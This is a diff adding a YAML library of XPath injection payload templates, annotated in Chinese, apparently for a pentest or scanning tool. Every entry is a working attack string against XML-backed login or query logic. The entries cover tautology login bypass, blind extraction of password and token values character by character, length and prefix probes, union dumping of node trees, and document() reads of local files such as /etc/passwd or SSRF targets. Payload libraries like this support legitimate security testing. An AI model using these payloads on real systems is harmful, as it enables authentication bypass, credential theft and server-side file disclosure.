@@ -1,0 +1,221 @@
+ruleDB: v0.1.0
+# XPath 注入模板。
+#
+# XPath 是独立的一门表达式语言（既不是 SQL 也不是 LDAP），content_type 用 xpath。
+# 注入点通常是把用户输入拼进 `//users/user[login/text()='输入' and password/text()='输入']`。
+#
+# 与 SQLi 最大的不同：XPath **没有注释**，闭合只能靠括号和引号配对，
+# 所以「注释掉后续条件」这条最常用的路子在这里不成立，得用 `or '1'='2` 把尾部吃掉。
+
+templates:
+  - id: xpath.generic.auth.or
+    name: XPath 登录绕过
+    desc: 最基础的一条。尾部补 or '1'='2 是为了吃掉后面剩下的一半引号和括号
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    body: "' or '1'='1' or '1'='2"
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.auth.or.numeric
+    name: XPath 数字型恒真
+    desc: 上下文是数字比较（无引号）时用这条
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    body: " or 1=1 or 1=2"
+    vars: []
+    requires: [fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.blind.count
+    name: XPath 盲注探节点数
+    desc: 先确定结果集大小，再逐层往下猜。节点名按目标 XML 结构改
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item", "record", "entry"], default: "user"}
+    body: "' or count(//<<node>>)=<<n>> or '1'='2"
+    vars: [n]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.blind.substring
+    name: XPath 盲注逐字符提取
+    desc: 取第 pos 个字符与候选比较。节点与属性名按目标结构改
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item"], default: "user"}
+      attr: {options: ["password", "passwd", "pwd", "secret", "token"], default: "password"}
+      # 第几个节点是**目标决定的**（要猜的是第 2 个用户的密码就得填 2），不该写死
+      idx:  {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or substring(//<<node>>[<<idx>>]/<<attr>>,<<pos>>,1)='<<ch>>' or '1'='2"
+    vars: [pos, ch]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.blind.name
+    name: XPath 盲注猜节点名
+    desc: 结构不明时先用它把节点名一个个问出来
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      idx: {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or name(//*[<<idx>>])='<<name>>' or '1'='2"
+    vars: [name]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.dump.union
+    name: XPath 联合取节点
+    desc: XPath 没有 UNION，用 | 做并集把整棵子树取出来。回显在页面上时最直接
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item"], default: "user"}
+    body: "'] | //<<node>>/* | //*['"
+    vars: []
+    requires: [fetch-sink, echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xpath.generic.blind.length
+    name: XPath 盲注探长度
+    desc: 逐字符猜之前先用它把长度确定下来，能少猜一大半。节点与属性名按目标 XML 结构改
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item", "record"], default: "user"}
+      attr: {options: ["password", "passwd", "pwd", "secret", "token"], default: "password"}
+      idx:  {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or string-length(//<<node>>[<<idx>>]/<<attr>>)=<<n>> or '1'='2"
+    vars: [n]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 别的函数 ----
+  # XPath 1.0 的函数集不大，但拿到 substring 之后还有几个更省事的：
+  # contains / starts-with 一次就能否掉一整段前缀，translate 用来绕大小写。
+
+  - id: xpath.generic.blind.contains
+    name: XPath 盲注 · contains 前缀确认
+    desc: >-
+      比逐字符猜快一个数量级的走法：已知前缀什么、就一次问「包含不包含」，
+      命中就把前缀接长再问。先用它把前缀拼到卡住，卡住之后才回到 substring 逐字符。
+      节点、属性、下标按目标 XML 结构改。
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item", "record", "entry"], default: "user"}
+      attr: {options: ["password", "passwd", "pwd", "secret", "token"], default: "password"}
+      idx:  {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or contains(//<<node>>[<<idx>>]/<<attr>>,'<<prefix>>') or '1'='2"
+    vars: [prefix]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xpath.generic.blind.translate
+    name: XPath 盲注 · translate 归一大小写
+    desc: >-
+      值里大小写混排（哈希、Base64、随机口令）时，逐字符猜要连带猜大小写。
+      translate 把整段先压成小写再比，候选集从 62 个降到 36 个。
+      要更省就在 translate 里把数字也干掉，先只问「是不是小写字母」。
+      节点、属性、下标按目标 XML 结构改。
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item", "record", "entry"], default: "user"}
+      attr: {options: ["password", "passwd", "pwd", "secret", "token"], default: "password"}
+      idx:  {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or translate(//<<node>>[<<idx>>]/<<attr>>,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='<<value>>' or '1'='2"
+    vars: [value]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xpath.generic.namespace.localname
+    name: XPath 盲注 · 默认命名空间
+    desc: >-
+      文档用了 xmlns= 默认命名空间时，//user 这种写法**永远匹配不到**节点——
+      XPath 1.0 里无前缀的名字只匹配无命名空间的节点，这是最常被当成「没有注入」
+      的一场空。local-name() 只比名字不看命名空间，用它把节点捞回来。
+      确有必要再限定命名空间时，在谓词里加 namespace-uri()='...'。
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    slots:
+      node: {options: ["user", "account", "item", "record", "entry"], default: "user"}
+      attr: {options: ["password", "passwd", "pwd", "secret", "token"], default: "password"}
+      idx:  {options: ["1", "2", "3", "4", "5"], default: "1"}
+    body: "' or //*[local-name()='<<node>>'][<<idx>>]/<<attr>>='<<ch>>' or '1'='2"
+    vars: [ch]
+    requires: [fetch-sink, boolean]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xpath.generic.document
+    name: XPath document() 读外部文档
+    desc: >-
+      XPath 1.0 的 document() 会去取另一个文档，于是它同时是读文件（file:///etc/passwd）
+      和 SSRF（http://…）的入口。**能不能用完全取决于引擎**：libxml 默认注册了这个
+      函数，但不少封装（PHP 的 DOMXPath、部分 Java 实现）把它禁掉了或没接加载器——
+      先拿一个肯定存在的文件试，没反应就别在它上面耗时间。
+      回显/盲注都要，false 只说明取不到，不说明语法错。
+    vuln: [xpath]
+    content_type: [xpath]
+    component: []
+    version: "*"
+    body: "' or string-length(document('<<target>>'))>0 or '1'='2"
+    vars: [target]
+    requires: [fetch-sink, boolean]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
